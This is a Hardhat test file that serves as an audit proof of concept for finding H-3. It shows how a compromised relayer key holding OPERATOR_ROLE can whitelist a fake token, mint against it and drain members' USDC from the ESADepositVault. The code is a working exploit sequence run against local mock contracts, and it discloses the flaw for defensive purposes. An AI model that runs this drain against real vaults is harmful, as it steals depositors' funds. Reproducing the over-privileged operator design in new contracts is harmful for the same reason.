import { expect } from "chai";
import { ethers, upgrades } from "hardhat";

const ONE_USDC = 10n ** 6n;

describe("AUDIT PoC 3 — hot operational keys", function () {
  it("H-3: the savings relayer key (vault OPERATOR_ROLE) can drain the ESA vault via a fake accepted token", async function () {
    const [admin, relayer, member, attacker] = await ethers.getSigners();
    const MockERC20 = await ethers.getContractFactory("MockERC20");
    const usdc: any = await MockERC20.deploy("USD Coin", "USDC", 6);
    const ClearUSD = await ethers.getContractFactory("ClearUSD");
    const clrusd: any = await ClearUSD.deploy(admin.address, 0, 0);
    const Vault = await ethers.getContractFactory("ESADepositVault");
    const vault: any = await upgrades.deployProxy(Vault, [await clrusd.getAddress(), admin.address], { kind: "uups" });
    await clrusd.grantIssuerRoles(await vault.getAddress());
    await vault.setAcceptedToken(await usdc.getAddress(), true);
    // As documented in on-chain-authority.md: the savings relayer holds the vault's OPERATOR_ROLE.
    await vault.grantRole(await vault.OPERATOR_ROLE(), relayer.address);

    // Members' real savings in the vault.
    await usdc.mint(member.address, 50_000n * ONE_USDC);
    await usdc.connect(member).approve(await vault.getAddress(), ethers.MaxUint256);
    await vault.connect(member).deposit(await usdc.getAddress(), 50_000n * ONE_USDC, member.address);

    // Relayer key compromised: accept a worthless 6-decimal token, mint against it, redeem USDC.
    const fake: any = await MockERC20.deploy("Fake", "FAKE", 6);
    await vault.connect(relayer).setAcceptedToken(await fake.getAddress(), true);
    await fake.mint(attacker.address, 50_000n * ONE_USDC);
    await fake.connect(attacker).approve(await vault.getAddress(), ethers.MaxUint256);
    await vault.connect(attacker).deposit(await fake.getAddress(), 50_000n * ONE_USDC, attacker.address);
    await clrusd.connect(attacker).approve(await vault.getAddress(), ethers.MaxUint256);
    await vault.connect(attacker).redeem(await usdc.getAddress(), 50_000n * ONE_USDC, attacker.address);

    expect(await usdc.balanceOf(attacker.address)).to.equal(50_000n * ONE_USDC);
    expect(await usdc.balanceOf(await vault.getAddress())).to.equal(0n); // members' backing gone
  });
});
